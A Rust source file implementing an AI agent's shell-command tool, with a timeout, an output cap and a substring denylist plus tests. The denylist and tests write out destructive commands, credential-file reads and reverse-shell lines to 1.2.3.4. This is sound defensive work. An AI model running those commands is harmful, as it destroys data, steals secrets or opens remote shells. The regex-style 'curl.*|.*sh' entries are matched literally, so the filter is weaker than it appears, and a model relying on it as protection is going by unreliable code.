//! Shell action — execute commands with capability gating.
//!
//! Only available at Trust tier or above. Commands are validated against
//! a denylist of dangerous patterns, executed with a timeout, and have
//! output size capped to prevent OOM.

use crate::Action;
use aivyx_core::Result;

/// Maximum command execution time (seconds).
const COMMAND_TIMEOUT_SECS: u64 = 60;

/// Maximum output size in bytes (1 MB).
const MAX_OUTPUT_BYTES: usize = 1_024 * 1_024;

/// Patterns that are always denied regardless of capability tier.
/// These prevent catastrophic damage even if the LLM is confused or injected.
const DENIED_PATTERNS: &[&str] = &[
    // Destructive filesystem operations
    "rm -rf /",
    "rm -rf /*",
    "mkfs",
    "dd if=",
    "> /dev/sd",
    // Credential/key theft
    "cat /etc/shadow",
    "cat /etc/passwd",
    // Privilege escalation
    "chmod 777 /",
    "chown root",
    // Network exfiltration
    "nc -e",
    "ncat -e",
    "bash -i >& /dev/tcp",
    "/dev/tcp/",
    "curl.*|.*sh",
    "wget.*|.*sh",
    // System shutdown
    "shutdown",
    "reboot",
    "init 0",
    "init 6",
    "poweroff",
    "halt",
];

/// Sensitive paths that should not be accessed via shell commands.
const DENIED_PATH_FRAGMENTS: &[&str] = &[
    "/etc/shadow",
    "/.ssh/",
    "/.gnupg/",
    "/.aws/credentials",
    "/.config/gcloud",
];

/// Check if a command matches any denied pattern.
fn is_command_denied(command: &str) -> Option<&'static str> {
    let lower = command.to_lowercase();

    for pattern in DENIED_PATTERNS {
        if lower.contains(&pattern.to_lowercase()) {
            return Some(pattern);
        }
    }

    DENIED_PATH_FRAGMENTS.iter().find(|&path| lower.contains(&path.to_lowercase())).map(|v| v as _)
}

/// Truncate output bytes to the limit, appending a notice if truncated.
fn cap_output(bytes: &[u8]) -> String {
    if bytes.len() <= MAX_OUTPUT_BYTES {
        String::from_utf8_lossy(bytes).into_owned()
    } else {
        let truncated = String::from_utf8_lossy(&bytes[..MAX_OUTPUT_BYTES]);
        format!("{truncated}\n...[output truncated at {MAX_OUTPUT_BYTES} bytes]")
    }
}

pub struct RunCommand;

#[async_trait::async_trait]
impl Action for RunCommand {
    fn name(&self) -> &str { "run_command" }

    fn description(&self) -> &str {
        "Execute a shell command and return its output (requires Trust tier). \
         Dangerous commands (rm -rf /, credential access, etc.) are blocked."
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute" },
                "working_dir": { "type": "string", "description": "Working directory (optional)" }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, input: serde_json::Value) -> Result<serde_json::Value> {
        let command = input["command"]
            .as_str()
            .ok_or_else(|| aivyx_core::AivyxError::Validation("command is required".into()))?;

        if command.trim().is_empty() {
            return Err(aivyx_core::AivyxError::Validation(
                "command must not be empty".into(),
            ));
        }

        // Check denylist before execution
        if let Some(pattern) = is_command_denied(command) {
            return Err(aivyx_core::AivyxError::CapabilityDenied(
                format!("Command blocked by safety denylist (matched: {pattern})")
            ));
        }

        let working_dir = input.get("working_dir").and_then(|v| v.as_str());

        // Validate working_dir if provided
        if let Some(dir) = working_dir {
            let path = std::path::Path::new(dir);
            if !path.is_absolute() {
                return Err(aivyx_core::AivyxError::Validation(
                    "working_dir must be an absolute path".into(),
                ));
            }
        }

        let mut cmd = tokio::process::Command::new("sh");
        cmd.arg("-c").arg(command);

        if let Some(dir) = working_dir {
            cmd.current_dir(dir);
        }

        // Execute with timeout
        let result = tokio::time::timeout(
            std::time::Duration::from_secs(COMMAND_TIMEOUT_SECS),
            cmd.output(),
        )
        .await;

        match result {
            Ok(Ok(output)) => {
                Ok(serde_json::json!({
                    "exit_code": output.status.code().unwrap_or(-1),
                    "stdout": cap_output(&output.stdout),
                    "stderr": cap_output(&output.stderr),
                }))
            }
            Ok(Err(e)) => Err(aivyx_core::AivyxError::Io(e)),
            Err(_) => Err(aivyx_core::AivyxError::Other(
                format!("Command timed out after {COMMAND_TIMEOUT_SECS}s")
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn denies_rm_rf_root() {
        assert!(is_command_denied("rm -rf /").is_some());
        assert!(is_command_denied("sudo rm -rf /*").is_some());
    }

    #[test]
    fn denies_credential_access() {
        assert!(is_command_denied("cat /etc/shadow").is_some());
        assert!(is_command_denied("cat ~/.ssh/id_rsa").is_some());
        assert!(is_command_denied("tar czf - ~/.aws/credentials").is_some());
    }

    #[test]
    fn denies_reverse_shell() {
        assert!(is_command_denied("bash -i >& /dev/tcp/1.2.3.4/4444").is_some());
        assert!(is_command_denied("nc -e /bin/sh 1.2.3.4 4444").is_some());
    }

    #[test]
    fn denies_shutdown() {
        assert!(is_command_denied("shutdown -h now").is_some());
        assert!(is_command_denied("reboot").is_some());
    }

    #[test]
    fn allows_safe_commands() {
        assert!(is_command_denied("ls -la").is_none());
        assert!(is_command_denied("echo hello").is_none());
        assert!(is_command_denied("cat README.md").is_none());
        assert!(is_command_denied("git status").is_none());
        assert!(is_command_denied("cargo test").is_none());
    }

    #[test]
    fn denies_case_insensitive() {
        assert!(is_command_denied("RM -RF /").is_some());
        assert!(is_command_denied("Shutdown -h now").is_some());
    }

    #[test]
    fn cap_output_within_limit() {
        let small = b"hello world";
        assert_eq!(cap_output(small), "hello world");
    }

    #[test]
    fn cap_output_truncates_large() {
        let large = vec![b'x'; MAX_OUTPUT_BYTES + 100];
        let result = cap_output(&large);
        assert!(result.contains("[output truncated"));
        assert!(result.len() < large.len() + 100);
    }

    #[tokio::test]
    async fn execute_rejects_empty_command() {
        let action = RunCommand;
        let input = serde_json::json!({ "command": "" });
        let result = action.execute(input).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn execute_rejects_denied_command() {
        let action = RunCommand;
        let input = serde_json::json!({ "command": "rm -rf /" });
        let result = action.execute(input).await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("denylist"));
    }

    #[tokio::test]
    async fn execute_runs_safe_command() {
        let action = RunCommand;
        let input = serde_json::json!({ "command": "echo hello" });
        let result = action.execute(input).await.unwrap();
        assert_eq!(result["exit_code"], 0);
        assert!(result["stdout"].as_str().unwrap().contains("hello"));
    }

    #[tokio::test]
    async fn execute_rejects_relative_working_dir() {
        let action = RunCommand;
        let input = serde_json::json!({ "command": "ls", "working_dir": "relative/path" });
        let result = action.execute(input).await;
        assert!(result.is_err());
    }
}
